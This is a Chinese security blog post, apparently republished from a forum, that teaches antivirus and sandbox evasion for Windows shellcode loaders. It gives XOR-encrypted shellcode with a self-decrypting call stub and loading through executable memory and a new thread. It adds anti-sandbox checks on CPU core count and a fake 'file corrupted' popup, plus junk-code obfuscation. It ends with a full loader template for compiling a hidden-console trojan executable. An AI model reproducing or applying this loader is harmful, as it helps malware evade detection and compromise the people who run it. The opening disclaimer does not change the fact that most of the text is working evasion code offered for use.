<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/E1q370tSNZG2DEcN0LZoFw)

点击上方 [蓝字]，关注我们

**建议大家把公众号 “Z2O 安全攻防” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png)

免责声明
====

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。

文章正文
====

免杀是同所有的检测手段的对抗，目前免杀的思路比较多。本篇介绍了一个独特的思路，通过内存解密恶意代码执行，解决了内存中恶意代码特征的检测。同时提出了 one click 来反沙箱的思路，阐述了一些混淆反编译的想法。

0x00 前言
=======

免杀是同所有的检测手段的对抗，目前免杀的思路比较多。本篇介绍了一个独特的思路，通过内存解密恶意代码执行，解决了内存中恶意代码特征的检测。同时提出了 one click 来反沙箱的思路，阐述了一些混淆反编译的想法。

0x01 声明
=======

请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。一切未经授权的网络攻击均为违法行为，互联网非法外之地。本篇文章不涉及商业秘密，使用的技术是公知技术，可以从公共渠道学习对应技术。本文描述的技术思路具有一定时效性，但拓展性强，变化能力强，上限高，其性质更贴切于抛砖引玉、讨论学习。商业转载请联系作者获得授权，非商业转载请注明出处。

0x02 流程
=======

1.  1. 通过双重 xor 对 shellcode 进行加密
    
2.  2. 申请内存执行指定命令
    
3.  3. 通过计算地址执行解密函数指令后执行 shellcode
    

效果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLIbNggsDDpcK3nmvib9TcpgUqFVYjeYyXmgcbn2dlibBc9btVn7ibZu1NQ/640?wx_fmt=png&from=appmsg)image.png![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLfLkDNs4bwkAGQl27rX0oGzibDLDKUdItJeeTLY1R3y9sxZL9fp5RAnw/640?wx_fmt=png&from=appmsg)image.png

0x03 免杀制作思路
===========

1、静态免杀
------

杀软是通过标记特征进行木马查杀的，我们可以通过加解密的方式来隐藏我们的恶意代码。加密的方式非常多，最常用的是 xor 双加密，除此之外你还可以使用 AES、SM4 等对称加密，也可以使用 SM9、RSA 等非对称加密。使用双重 xor 的方式进行加密，其中`^6^184`，6 和 184 就是两个 key。

```
unsigned char shellcode[] = "";

void encrypt(){
 for(int j = 0;j<sizeof(shellcode);j++)
 {
 \*(unsigned char\*)&shellcode[j] = \*(unsigned char\*)&shellcode[j]^6^184;
 printf("\\x%02x",\*(unsigned char\*)&shellcode[j]);
 }
}

```

解密的方式就是将两个 key 反过来异或。

```
void decrypt()
{
 for(int i = 5;i<sizeof(shellcode);i++)
 {
 ((char\*)p)[i] = ((char\*)p)[i]^184^6;
 }
}

```

2、动态免杀
------

### 内存解密恶意代码

恶意代码检测的方式非常之多，如 EDR 常用的特征检测、HOOK 常用 API、检测父子进程关系等方式。尽管我们已经使用了加密的方式绕过了静态检测，但在内存中解密后的明文恶意代码仍然很容易被检测出来，尤其是在我们调用解密函数返回之后。针对这个问题，我们可以尝试将加密后的恶意代码和解密的指令一同写入到内存中执行，完成 shellcode 的自动解密，在很多时候这样可以绕过检测。

原理是在真正的 shellcode 执行之前通过`call`指令跳到我们想跳的地方去，比如到刚才的解密函数：

```
unsigned char shellcode[] = "\xe8\x2b\x10\x06\x00......<真正的加密后的shellcode>"

```

在经过加密后的 shellcode 之前插入一条`call`指令，可以是直接`call e8`或间接`call ff15`，当然使用`jmp`或`jcc`等其他的方式也可以，目的是 ** 跳转到我们的解密函数 **，当解密函数执行完并返回之后，`e8 call`后的 shellcode 已经完成了解密，继续跑下去就可以正常执行恶意代码了。那么现在问题在于如何构建我们的`e8 call`指令，我们可以参考 Intel 的白皮书：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLBPrDicuibTIJGRjNh3yq41An5diafOHNeXzVTfGeLOaI5naA0TMcefkaA/640?wx_fmt=png&from=appmsg)image.png

`e8 call`的格式是`CALL Jz`，那么这里的`f64`和`Jz`是什么意思呢，继续翻官方文档：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLTiaSRVlEx8xCK3louhGuFzNJHfib6uNLmrwhbH33w2wbdISzURAKUDMQ/640?wx_fmt=png&from=appmsg)image.png![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLTFVFZGbkGSogfNMicZqswTzKtS6kgW1Un7kqib9icSToibiaYIf30v4UW8Q/640?wx_fmt=png&from=appmsg)image.png![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLLhChgJAYJFzBBVavwtOHIWejWufCKEUyUN2KIds0cQggzEMr9rfl5Q/640?wx_fmt=png&from=appmsg)image.png

简而言之就是对于`e8`这样的操作码，当在 CPU 是 64 位模式下的时候，操作数会被强制为 64 位的，由于我们现在是运行在 32 位的模式下，这点我们先不关注；`e8`后应该跟上一个 **32 位的相对偏移 **，通过当前下一条指令的地址加上这个偏移，才是 CPU 在解析 e8 这条指令的时候，该跳转的函数地址。

#### 偏移计算方式

那么我们可以在调用 shellcode 的代码处下个断点，通过在反汇编里分别查看 decrypt 函数以及`e8 call`下一条指令的地址，进而算出这里我们需要的相对偏移，也就是`decrypt函数的地址-e8下一条指令的地址`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLYvka2eyb5k0jBAQycSUM8tliaEYKiaWyEKI68Tjx2jr24oBfXKLCbvug/640?wx_fmt=png&from=appmsg)image.png![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLURwLpJWfBRhUaeB4B7SrVd78UPFlVK4GHymic9ic0qa7HNtxbfPWzTsQ/640?wx_fmt=png&from=appmsg)image.png![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLX2sK80oIbrXJO3qdlG8U07EYq4ic7tCRx1LicMsOCFlLQwHo3HZIABAw/640?wx_fmt=png&from=appmsg)image.png

最后将算出的四字节偏移填充到`e8`后面就好了，比如我这里按照 Windows 的小端存储方式，最后的结果就应该是`e8 2b 10 06 00`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLQ8ul5kD8JHMjUO7Jff3GBibYfh2piaeX8x6LeZSt3le0oeeGQibkhXr9w/640?wx_fmt=png&from=appmsg)image.png

至此，我们完成了自己调用解密函数，对自己进行解密的完整代码编写。

### 恶意代码加载方式

#### 创建线程加载

动态涉及到了 shellcode 的加载方式。这里我选择使用创建线程的方式加载。1、创建 ThreadProc 函数

```
DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
 //申请内存
 if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE)) == NULL)
 {
 return 1;
 }
 //复制shellcode
 if (!(memcpy(p, shellcode, sizeof(shellcode))))
 {
 return 1;
 }

 //函数指针赋值
 CODE code = (CODE)p;
 //调用
 code();
 return 0;
}

```

2、 通过 `CreateThread`函数创建线程并执行线程函数`ThreadProc`。

```
void main(int argc, char\* argv[])
{ 
 //创建一个新的线程 
 HANDLE hThread = ::CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);

 //如果不在其他的地方，关闭句柄 
 ::CloseHandle(hThread); 
}

```

#### 主线程加载

加载 shellcode 的方式是一样的，但是这里没有启动新线程，容易造成主线程卡死。

```
 unsigned char shellcode[] = "";

 void \*exec = VirtualAlloc(0, sizeof shellcode, MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
 memcpy(exec, shellcode, sizeof shellcode);
 ((void(\*)())exec)();

```

#### 内联加载

通过 asm 方法内联写入汇编指令。通常我们可以使用 \_\_asm 来书写。

```
\_\_asm {
 nop
 ret
}

```

这种方式的好处是不需要调用`VirtualAlloc`API，但缺点是很容易识别成特征。

```
#include <Windows.h>
#include <stdio.h>

int main() {
 printf("spotless");
 asm(".byte 0x90,0x90,0x90,0x90\n\t"
 "ret\n\t");
 return 0;
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLtL3qtxnXJ2QF3ibFt8A76Htob2cxakKVNxJuYJ2TSDkgL7vnB9PFWDQ/640?wx_fmt=png&from=appmsg)image.png

> 参考：CreateRemoteThread Shellcode Injection - Red Team Notes

3、反沙箱
-----

根据程序运行环境判断是否存在沙箱环境： `开机时间、内存大小、磁盘大小、CPU核心数量、CPU温度...`

> 代码可以参考：CheckVM-Sandbox、anti-sandbox

这些都是自动检测，我们也可以使用主动的方式绕过沙箱，例如`延迟执行、弹窗确认`

### 弹窗确认

要求用户必须进行操作才能进行下一步执行。弹窗就是一个很好的例子，点开后不关闭或者点击确认操作就不会继续执行程序。沙箱没有自动模拟点击的情况下，程序就不会执行，恶意代码就不会释放。

```
#include <windows.h>

void main(int argc, char\* argv[])
{
 MessageBox(NULL, "文件损坏", "错误", MB\_RETRYCANCEL | MB\_ICONWARNING);
 ...
}


```

在 main 函数里使用`MessageBox`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuanCHMJlwBxE4Z6Vt6IsnlLjJrKSg6EIvjf5BpNjcXkZDqe7icXVdBGxhC4JK9xHuEapF2LSkSalvw/640?wx_fmt=png&from=appmsg)image.png

### CPU 内核数量检测

规则：处理器数量少于 4 个时，我们断言它是沙箱环境。

#### API 获取

想要获取有关系统硬件和资源的信息，我们可以使用`kernel32.dll`中的`GetSystemInfo`函数。它会返回指向 `SYSTEM\_INFO` 结构体的指针，它的结构体定义如下：

```
typedef struct \_SYSTEM\_INFO {
 union {
 DWORD dwOemId;
 struct {
 WORD wProcessorArchitecture;
 WORD wReserved;
 } DUMMYSTRUCTNAME;
 } DUMMYUNIONNAME;
 DWORD dwPageSize;
 LPVOID lpMinimumApplicationAddress;
 LPVOID lpMaximumApplicationAddress;
 DWORD\_PTR dwActiveProcessorMask;
 DWORD dwNumberOfProcessors;
 DWORD dwProcessorType;
 DWORD dwAllocationGranularity;
 WORD wProcessorLevel;
 WORD wProcessorRevision;
} SYSTEM\_INFO, \*LPSYSTEM\_INFO;

```

*   • `wProcessorArchitecture`: ** 处理器架构 **（x86、x64 等）。
    
*   • `dwNumberOfProcessors`: 系统中的 ** 处理器数量 **。
    

```
void CheckCPU() {
SYSTEM\_INFO systemInfo;
GetSystemInfo(&systemInfo);

if (systemInfo.dwNumberOfProcessors <= 4) {
ExitProcess(61);
}
}

```

#### 偏移获取

相对于 API 获取，这种方式不容易检测。

> 注意使用`\_\_asm`嵌入汇编语言只能在`x86`位下编译。

主要原理是获取 PEB 结构体中的`NumberOfProcessors`字段值来进行判断。它在结构体中偏移量为`0x64`。部分 PEB 偏移对应变量：

```
...
/\*058\*/ ULONG AnsiCodePageData;
/\*05C\*/ ULONG OemCodePageData;
/\*060\*/ ULONG UnicodeCaseTableData;
/\*064\*/ ULONG NumberOfProcessors;
/\*068\*/ LARGE\_INTEGER NtGlobalFlag; // Address of a local copy
/\*070\*/ LARGE\_INTEGER CriticalSectionTimeout;
/\*078\*/ ULONG HeapSegmentReserve;
...

```

检测代码实现：

```
BOOL checkCPUCores()
{
 INT i = 0;
 \_asm {
 mov eax, dword ptr fs:[0x18]; // 获取 FS 寄存器中的 TEB (Thread Environment Block) 结构体地址
 mov eax, dword ptr ds:[eax + 0x30]; // 获取 PEB (Process Environment Block) 结构体地址
 mov eax, dword ptr ds:[eax + 0x64]; // 获取 PEB 结构体中的 NumberOfProcessors 字段值
 mov i, eax; // 将 NumberOfProcessors 值赋给变量 i
 }
 return i <= 4; // 返回是否处理器核心数量小于或等于 4
}

```

> PEB 结构体可以看：PEB 结构

4、混淆反编译
-------

### 垃圾函数

顾名思义，我们可以在 shellcode 加载器里添加各种垃圾函数。这些垃圾函数最好对 ** 堆栈有较大的影响 **，在我们学习 C 语言时最常见的就是排序，下面列举了快速排序和冒泡排序。

```
void quickSort(int arr[], int left, int right) {
 int i = left, j = right;
 int tmp;
 int pivot = arr[(left + right) / 2];

 while (i <= j) {
 while (arr[i] < pivot)
 i++;
 while (arr[j] > pivot)
 j--;
 if (i <= j) {
 tmp = arr[i];
 arr[i] = arr[j];
 arr[j] = tmp;
 i++;
 j--;
 }
 }

 if (left < j)
 quickSort(arr, left, j);
 if (i < right)
 quickSort(arr, i, right);
}

void bubbleSort(int arr[], int n) {
 for (int i = 0; i < n - 1; i++) {
 for (int j = 0; j < n - i - 1; j++) {
 if (arr[j] > arr[j + 1]) {
 int k = arr[j];
 arr[j] = arr[j + 1];
 arr[j + 1] = k;
 }
 }
 }
}

```

然后我们在代码中以代码块的方式贴入垃圾代码。

```
void main() {
 {
 int huaarr[] = { 12, 12, 15, 11, 1, 10, 13 };
 int huan = sizeof(huaarr) / sizeof(huaarr[0]);

 bubbleSort(huaarr, huan);
 }
 //
 // 这里输入自己的代码
 //
 {
 int huaarr[] = { 12, 12, 15, 11, 1, 10, 13 };
 int huan = sizeof(huaarr) / sizeof(huaarr[0]);

 bubbleSort(huaarr, huan);
 }
}

```

0x04 代码
=======

使用该代码的流程：

1.  1. 使用加密函数加密 shellcode
    
2.  2. 将 shellcode 填充到`"\xe8\x2b\x10\x06\x00"`字符常量的后面
    
3.  3. 编译生成木马 exe
    

```
#include <windows.h>
#include <stdio.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//隐藏控制台

typedef void (\*CODE)();
/\* length: 844 bytes \*/
//0xe8, 0x2b, 0x10, 0x06, 0x00,...
unsigned char shellcode[] = "\xe8\x2b\x10\x06\x00";

PVOID p = NULL;

void decrypt()
{
 //解密Shellcode
 for(int i = 5;i<sizeof(shellcode);i++)
 {
 ((char\*)p)[i] = ((char\*)p)[i]^184^6;
 }

}

// 检查CPU核心数
// SYSTEM\_INFO.dwNumberOfProcessors
INT checkCPUCores(INT cores)
{
 INT i = 0;
 \_asm { // x64编译模式下不支持\_\_asm的汇编嵌入
 mov eax, dword ptr fs : [0x18]; // TEB
 mov eax, dword ptr ds : [eax + 0x30]; // PEB
 mov eax, dword ptr ds : [eax + 0x64];
 mov i, eax;
 }
 return i;
}

DWORD WINAPI ThreadProc( 
 LPVOID lpParameter // thread data
 )
{

 //申请内存
 if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE)) == NULL)
 {
 //MessageBoxW(NULL, L"VirtualAlloc Failed!!!", L"Prompt", MB\_OK);
 return 1;
 }

 //复制shellcode
 if (!(memcpy(p, shellcode, sizeof(shellcode))))
 {
 //MessageBoxW(NULL, L"WriteMemory Failed!!!", L"Prompt", MB\_OK);
 return 1;
 }

 //函数指针赋值
 CODE code = (CODE)p;

 //调用
 code();

 return 0;
}

int main(int argc, char\* argv[])
{

 //检查CPU核心数，判断是否是沙箱
 INT cores = checkCPUCores(4);
 if (cores <= 4)
 {
 //((void(\*)(void))&shellcode)(); //函数指针执行ShellCode
 //创建一个新的线程 
 HANDLE hThread = ::CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);

 //如果不在其他的地方，关闭句柄 
 ::CloseHandle(hThread); 

 }
 while(1)
 {
 OutputDebugString("Hello World!\n");//打印调试信息
 }
 return 0;
}


```

0x05 总结
=======

本篇介绍的方法，类似于写入汇编指令，只不过 call 调用的地址需要我们自己去计算，如果代码存在变动（汇编指令增加）的情况，如增加全局变量，那么需要重新计算解密函数的地址。虽然麻烦，但很灵活，学习成本较低，效果明显。

文章来源：https://forum.butian.net/share/2669

技术交流
====

### 知识星球

**欢迎加入知识星球****，星球**致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。**针对网络安全成员的普遍水平，为星友提供了教程、工具、POC&EXP 以及各种学习笔记等等**。****

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXPg6kVsggaWKZsh0ab2kh6icbbkBgOH8icuV0x2IPGGRMiaU2hNBErstcA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmX8Pjria4EK9ib8PPUAxiaMaSqUZibdxNoqqmmVHqGwXkYdzziaZNDLOwCGQw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKubkRgdNbBQdOZibtbt7oibUpdUIl55vlmiaibqInxXG1Z9tfo52jF8onER5R4U2mCM5RpZia6rwEHnlMAg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYItiapGtLIq3gAQYGfE5nictnkFeBicm7brKdibz4Va1hRf2dKZT0IyRRXYboE1lbZ6ZquDGnzqKibGGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXp9icV9yPQic4EnrpFeIcHB5eBy1GQaoSxbzevjM5QyGl4UFGibuEfwkLQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

### 交流群

关注公众号回复 “**加群**”，添加 Z2OBot 好友，自动拉你加入 **Z2O 安全攻防交流群 (微信群)** 分享更多好东西。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 关注我们

**关注福利：**

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

点个【 在看 】，你最好看